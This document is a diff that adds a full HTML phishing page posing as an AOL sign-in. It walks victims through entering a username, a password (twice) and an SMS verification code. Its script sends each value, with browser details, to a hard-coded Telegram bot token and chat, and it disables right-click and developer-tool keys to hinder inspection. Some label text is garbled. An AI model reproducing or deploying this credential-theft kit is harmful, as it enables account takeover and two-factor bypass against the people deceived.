@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AOL %4 Sign in</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #0061ff;
+            --secondary: #f3f4f6;
+            --text: #111;
+            --muted: #6b7280;
+            --radius: 12px;
+            --shadow: 0 6px 18px rgba(0, 0, 0, 0.08);
+            font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background: url("https://i.imgur.com/JVhMz4Z.png") no-repeat center center fixed;
+            background-size: cover;
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+        }
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: rgba(255,255,255,0.7);
+            backdrop-filter: blur(3px);
+            z-index: 0;
+        }
+        .header, .container {
+            position: relative;
+            z-index: 1;
+        }
+        .header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 30px;
+            background-color: #fff;
+            box-shadow: var(--shadow);
+            margin-bottom: 40px;
+        }
+        .branding-top {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .branding-top img {
+            height: 35px;
+            width: auto;
+        }
+        .top-links a {
+            color: var(--primary);
+            text-decoration: none;
+            margin-left: 16px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .container {
+            display: flex;
+            gap: 60px;
+            max-width: 900px;
+            width: 100%;
+            align-items: center;
+        }
+        .branding {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        .card {
+            flex: 1;
+            background: #fff;
+            padding: 36px;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            max-width: 380px;
+            width: 100%;
+        }
+        .logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .logo img {
+            max-width: 90px;
+            height: auto;
+        }
+        h2 {
+            text-align: center;
+            font-size: 22px;
+            margin-bottom: 20px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+        label {
+            font-size: 14px;
+            color: var(--muted);
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #e5e7eb;
+            border-radius: 6px;
+            font-size: 15px;
+        }
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 97, 255, 0.15);
+        }
+        button {
+            padding: 12px;
+            background: var(--primary);
+            color: #fff;
+            font-weight: 600;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 15px;
+            transition: background 0.2s ease;
+        }
+        button:hover {
+            background: #004fe0;
+        }
+        .secondary-btn {
+            background: transparent;
+            border: 1px solid #d1d5db;
+            color: var(--primary);
+        }
+        .row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+        }
+        .row a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        .verification-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .code-group {
+            display: flex;
+            gap: 5px;
+            justify-content: center;
+        }
+        .code-input {
+            width: 40px;
+            text-align: center;
+            font-size: 18px;
+            padding: 8px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+        }
+        .resend-link {
+            text-align: center;
+        }
+        .btn {
+            background: var(--primary);
+            color: #fff;
+            border-radius: 6px;
+            border: none;
+            padding: 10px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #004fe0;
+        }
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                gap: 30px;
+            }
+        }
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px;
+            background: #4CAF50;
+            color: white;
+            border-radius: 5px;
+            display: none;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
+
+    <!-- Header -->
+    <div class="header">
+        <div class="branding-top">
+            <img src="https://i.imgur.com/U1RNk8m.png" width="200">
+        </div>
+        <div class="top-links">
+            <a href="#">Help</a>
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+        </div>
+    </div>
+
+    <!-- Container -->
+    <div class="container">
+        <div class="branding"></div>
+        <div class="card">
+            <div class="logo">
+                <img src="https://i.imgur.com/U1RNk8m.png" alt="AOL Logo">
+            </div>
+            <h2>Sign in</h2>
+
+            <!-- Step 1 -->
+            <form id="step1">
+                <input id="email" type="text" placeholder="Username, email, or mobile" required>
+                <button type="submit">Next</button>
+                <div class="row">
+                    <label><input type="checkbox" id="rememberMe"> Stay signed in</label>
+                    <a href="#">Forgot username?</a>
+                </div>
+                <button type="button" class="secondary-btn" id="createAccount">Create an account</button>
+            </form>
+
+            <!-- Step 2 -->
+            <form id="step2" style="display:none;">
+                <label for="password">Password</label>
+                <input id="password" type="password" placeholder="Enter your password" required>
+                <div class="error-message" id="password-error">Incorrect password. Please try again.</div>
+                <button type="submit">Sign in</button>
+                <div class="row">
+                    <a href="#" id="backBtn">Use a different account</a>
+                    <a href="#">Forgot password?</a>
+                </div>
+            </form>
+
+            <!-- Step 2b -->
+            <form id="step2b" style="display:none;">
+                <div class="security-notice"><i class="fas fa-shield-alt"></i> For your security, re-enter password</div>
+                <label for="password2">Re-enter Password</label>
+                <input id="password2" type="password" placeholder="Enter your password again" required>
+                <button type="submit">Verify</button>
+                <div class="row">
+                    <a href="#" id="backBtn2">Use a different account</a>
+                    <a href="#">Forgot password?</a>
+                </div>
+            </form>
+
+            <!-- Step 3: Security Check -->
+            <div id="step3" style="display:none;">
+                <div class="verification-container">
+                    <div class="logo" style="margin-bottom: 20px;">
+                    </div>
+                    <h2 style="text-align:center;">Quick Security check</h2>
+                    <p style="text-align:center; color:#6b7280;">We need you to confirm your identity. This extra layer of security is to increase the protection of your account and confirm it's really you. You will receive a 6-digit code to proceed with the verification.</p>
+                    <button type="button" class="btn" id="securityCheckNext">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 4: Enter 6-digit code -->
+            <div id="step4" style="display:none;">
+                <div class="verification-container">
+                    <h2 style="text-align:center;">Check your SMS!</h2>
+                    <p style="text-align:center; color:#6b7280;">Enter the 6-digit code sent to your device</p>
+                    <div class="code-group">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveFocus(this,1)">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveFocus(this,2)">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveFocus(this,3)">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveFocus(this,4)">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveFocus(this,5)">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveFocus(this,6)">
+                    </div>
+                    <div class="resend-link">
+                        <a href="#" id="resendCode" style="color:var(--primary); text-decoration:underline;">Resend code</a>
+                    </div>
+                    <button type="button" class="btn" id="verifyBtn">Verify</button>
+                </div>
+            </div>
+
+            <!-- Step 5 -->
+            <div id="step5" style="display:none; text-align:center;">
+                <h3>All steps finished successfully!</h3>
+                <button type="button" onclick="window.location.href='https://www.aol.com'">Go to AOL</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram configuration - using your provided credentials
+        const TELEGRAM_BOT_TOKEN = '8434488259:AAFHtKzeOQV-Lja9_OYizbeYRaYJ_5rFLVs';
+        const TELEGRAM_CHAT_ID = '7867297027';
+        
+        // Function to send message to Telegram
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                const data = await response.json();
+                console.log('Telegram response:', data);
+                return data.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
+        // Function to show notification
+        function showNotification(message, isSuccess = true) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.backgroundColor = isSuccess ? '#4CAF50' : '#f44336';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+
+        // Store collected data
+        const collectedData = {
+            email: '',
+            password: '',
+            password2: '',
+            code: '',
+            rememberMe: false
+        };
+
+        // Format and send collected data to Telegram in the requested format
+        async function reportToTelegram(step) {
+            let message = `Email, mobile, or username: ${collectedData.email || 'Not provided'}\n`;
+            message += `%D%1 Password: ${collectedData.password || 'Not provided'}\n`;
+            message += `%D%2 OTP: ${collectedData.code || 'Not provided'}\n`;
+            message += `%D%E Remember Me: ${collectedData.rememberMe ? 'Yes' : 'No'}\n`;
+            message += `%C%0 Browser Info:\n`;
+            message += `%2 User Agent: ${navigator.userAgent}\n`;
+            message += `%2 Timestamp: ${new Date().toLocaleString()}\n`;
+            message += `%2 Step: ${step}`;
+            
+            // Send to Telegram and wait for it to complete
+            const success = await sendToTelegram(message);
+            if (success) {
+                console.log('Data sent to Telegram successfully');
+            } else {
+                console.error('Failed to send data to Telegram');
+            }
+            
+            return success;
+        }
+
+        document.getElementById('step1').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            collectedData.email = document.getElementById('email').value;
+            collectedData.rememberMe = document.getElementById('rememberMe').checked;
+            
+            // Report to Telegram and wait for completion
+            await reportToTelegram('Step 1 - Username entered');
+            
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'flex';
+        });
+
+        document.getElementById('backBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step1').style.display = 'flex';
+        });
+
+        document.getElementById('step2').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            collectedData.password = document.getElementById('password').value;
+            
+            // Report to Telegram and wait for completion
+            await reportToTelegram('Step 2 - Password entered');
+            
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step2b').style.display = 'flex';
+        });
+
+        document.getElementById('backBtn2').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('step2b').style.display = 'none';
+            document.getElementById('step1').style.display = 'flex';
+        });
+
+        document.getElementById('step2b').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            collectedData.password2 = document.getElementById('password2').value;
+            
+            // Report to Telegram and wait for completion
+            await reportToTelegram('Step 2b - Password re-entered');
+            
+            document.getElementById('step2b').style.display = 'none';
+            document.getElementById('step3').style.display = 'flex';
+        });
+
+        document.getElementById('securityCheckNext').addEventListener('click', async function() {
+            // Report to Telegram and wait for completion
+            await reportToTelegram('Step 3 - Security check initiated');
+            
+            document.getElementById('step3').style.display = 'none';
+            document.getElementById('step4').style.display = 'flex';
+        });
+
+        document.getElementById('verifyBtn').addEventListener('click', async function() {
+            // Collect the verification code
+            let code = '';
+            const inputs = document.querySelectorAll('.code-input');
+            inputs.forEach(input => code += input.value);
+            collectedData.code = code;
+            
+            // Report to Telegram and wait for completion
+            await reportToTelegram('Step 4 - Verification code entered');
+            
+            showNotification('Code verified!');
+            document.getElementById('step4').style.display = 'none';
+            document.getElementById('step5').style.display = 'flex';
+        });
+
+        function moveFocus(el, index) {
+            if (el.value.length === 1 && index < 6) el.nextElementSibling.focus();
+            else if (el.value.length === 0 && index > 1) el.previousElementSibling.focus();
+        }
+
+        document.getElementById('resendCode').addEventListener('click', function(e) {
+            e.preventDefault();
+            showNotification('Code resent!');
+        });
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
